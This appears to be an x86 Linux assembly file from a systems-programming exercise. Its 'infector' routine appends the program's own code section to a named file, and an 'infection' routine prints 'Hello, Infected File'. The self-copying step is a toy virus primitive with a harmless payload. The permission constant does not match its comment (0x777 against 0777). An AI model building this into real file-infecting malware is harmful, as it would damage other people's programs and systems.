section .text
    global _start
    global system_call
    global code_start
    global infection
    global infector
    global code_end
    extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80        ; Transfer control to operating system
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
	infected_msg: db "Hello, Infected File", 10	; format string

infection:

    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    ; system_call(SYS_WRITE(4), STDOUT(1), "Hello, Infected File\n"(infected_msg), 21);
    mov eax, 4
    mov ebx, 1
    mov ecx, infected_msg
    mov edx, 21
    int 0x80

    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

infector:

    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    ; system_call(SYS_OPEN (5), file_name, O_APPEND(1024) + O_RDRW(2), 0777);
    mov eax, 5
    mov ebx, [ebp + 8]
    mov ecx, 1026
    mov edx, 0x777
    int 0x80

    ; system_call(SYS_WRITE(4), file, code(start->end), end - start);
    mov ebx, eax
    mov eax, 4
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start
    int 0x80

    ; system_call(SYS_CLOSE(6), file);
    mov eax, 6
    int 0x80

    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
    
code_end: